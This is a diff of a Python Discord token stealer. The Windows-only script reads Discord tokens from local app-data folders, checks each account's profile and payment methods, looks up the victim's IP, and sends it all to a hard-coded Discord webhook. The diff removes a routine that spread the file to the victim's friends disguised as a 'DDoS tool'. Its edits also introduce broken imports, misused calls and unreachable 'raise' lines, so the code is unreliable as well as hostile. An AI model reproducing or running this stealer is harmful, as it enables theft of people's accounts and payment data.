@@ -1,21 +1,26 @@
 import os
 
+
 if os.name != "nt":
     exit()
+
+
+import json
+from urllib import request, urlopen
 from re import findall
-from json import loads, dumps
 from base64 import b64decode
 from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
 from threading import Thread
-from time import sleep
 from sys import argv
+
 
 one="https://discord.com/api/webhooks/"
 two="925773749989539880/"
 three="LEv63vv4yQNh05ghC3bZytPUPywS5h0JdfjTx82h58cPW-sssXsDoPnDRPMyTcznpALY"
 
+
 WEBHOOK_URL = one + two + three
+
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -42,10 +47,11 @@ def getHeader(token=None, content_type="application/json"):
 
 def getUserData(token):
     try:
-        return loads(
-            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
+        return json.loads(
+            urlopen(request.Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
     except:
-        pass
+        return "Failed to get user data"
+        raise
 
 
 def getTokenz(path):
@@ -64,65 +70,24 @@ def getTokenz(path):
 def whoTheFuckAmI():
     ip = "None"
     try:
-        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
+        ip = json.loads(request.get("https://api.ipify.org?format=json").text)
     except:
-        pass
-    return ip
-
-
-def hWiD():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-
-def getFriends(token):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
-                                     headers=getHeader(token))).read().decode())
-    except:
-        pass
-
-
-def getChat(token, uid):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
-                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-    except:
-        pass
+        ip = "Can't Access"
+        raise
+    return ip["ip"]
 
 
 def paymentMethods(token):
     try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+        return bool(len(json.loads(urlopen(request.Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                               headers=getHeader(token))).read().decode())) > 0)
     except:
-        pass
-
-
-def sendMessages(token, chat_id, form_data):
-    try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
-                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
-                        data=form_data.encode())).read().decode()
-    except:
-        pass
-
-
-def spread(token, form_data, delay):
-    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
-    for friend in getFriends(token):
-        try:
-            chat_id = getChat(token, friend["id"])
-            sendMessages(token, chat_id, form_data)
-        except Exception as e:
-            pass
-        sleep(delay)
+        return "Cant Get Payment Methods"
+        raise
 
 
 def main():
     cache_path = ROAMING + "\\.cache~$"
-    prevent_spam = True
-    self_spread = True
     embeds = []
     working = []
     checked = []
@@ -144,7 +109,8 @@ def main():
                 try:
                     uid = b64decode(token.split(".")[0].encode()).decode()
                 except:
-                    pass
+                    print(e)
+                    raise
                 if not uid or uid in working_ids:
                     continue
             user_data = getUserData(token)
@@ -180,9 +146,6 @@ def main():
                 "author": {
                     "name": f"{username} ({user_id})",
                 },
-                "footer": {
-                    "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
-                }
             }
             embeds.append(embed)
     with open(cache_path, "a") as file:
@@ -199,19 +162,14 @@ def main():
     }
     try:
         
-        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
+        urlopen(request.Request(WEBHOOK_URL, data=json.dumps(webhook).encode(), headers=getHeader()))
     except:
-        pass
-    if self_spread:
-        for token in working:
-            with open(argv[0], encoding="utf-8") as file:
-                content = file.read()
-            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
-            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+        return "Cant Send Requests"
+        raise
 
 
 try:
     main()
 except Exception as e:
     print(e)
-    pass
+    raise
